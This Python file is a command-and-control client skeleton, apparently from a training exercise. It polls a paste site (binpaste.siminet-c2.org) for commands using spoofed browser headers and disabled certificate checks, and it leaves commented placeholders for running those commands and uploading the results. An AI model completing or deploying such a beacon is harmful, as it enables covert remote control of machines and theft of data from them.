# THIS IS THE CLIENT

import requests
import re
import urllib3
import subprocess
import time
import base64
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Function to get username and password from command-line arguments
def get_user_credentials():
    if len(sys.argv) < 5:
        sys.exit(1)

    username = None # -u
    password = None # -p
    polltime = 10 # -t

    for i in range(1, len(sys.argv), 2):
        if sys.argv[i] == '-u':
            username = sys.argv[i + 1]
        elif sys.argv[i] == '-p':
            password = sys.argv[i + 1]
        elif sys.argv[i] == '-t':
            try:
                polltime = int(sys.argv[i + 1])
                if polltime < 0:
                    polltime = 10
            except ValueError as e:
                polltime = 10
                continue

    if username is None or password is None:
        sys.exit(1)

    return username, password, polltime

# Main function
def main():
    username, password, polltime = get_user_credentials()

    # Define login URL and credentials
    login_url = "https://binpaste.siminet-c2.org/login"
    poll_url = "https://binpaste.siminet-c2.org/"
    paste_url = "https://binpaste.siminet-c2.org/paste"

    # Headers (customize as needed)
    # -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br, zstd' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: https://binpaste.siminet-c2.org' -H 'Connection: keep-alive' -H 'Referer: https://binpaste.siminet-c2.org/' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' -H 'Priority: u=0, i'

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://binpaste.siminet-c2.org",
        "Connection": "keep-alive",
        "Referer": "https://binpaste.siminet-c2.org/",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Priority": "u=0, i"
    }

    # Session to persist cookies
    session = requests.Session()
    session.verify = False

    # Login payload (adjust based on site's login form)
    payload = {
        "username": username,
        "password": password
    }

    # Perform login request
    response = session.post(login_url, data=payload, headers=headers)

    runloop = True
    cmdtags = []

    # Check login success
    if response.status_code == 200:
        while runloop:
            # Check the main URL for paste links
            response = session.get(poll_url, headers=headers)
            paste_links = re.findall(r'href="(/paste/\d+)"', response.text)
            if paste_links:
                for link in paste_links:
                    full_url = f"https://binpaste.siminet-c2.org{link}"
                    # Fetch paste content
                    paste_response = session.get(full_url, headers=headers)
                    if paste_response.status_code == 200:                    
                        match = re.search(r'<pre>(.*?)</pre>', paste_response.text, re.DOTALL)
                        if match:                            
                            paste_content = match.group(1)
                            print(paste_content)
                            # (your code here)                            
                            # (execute the command)
                            # (upload the command execution result)
                            # post_response = session.post(paste_url, data=post_payload, headers=headers)
                            # delete the result?
            time.sleep(polltime)

if __name__ == "__main__":
    main()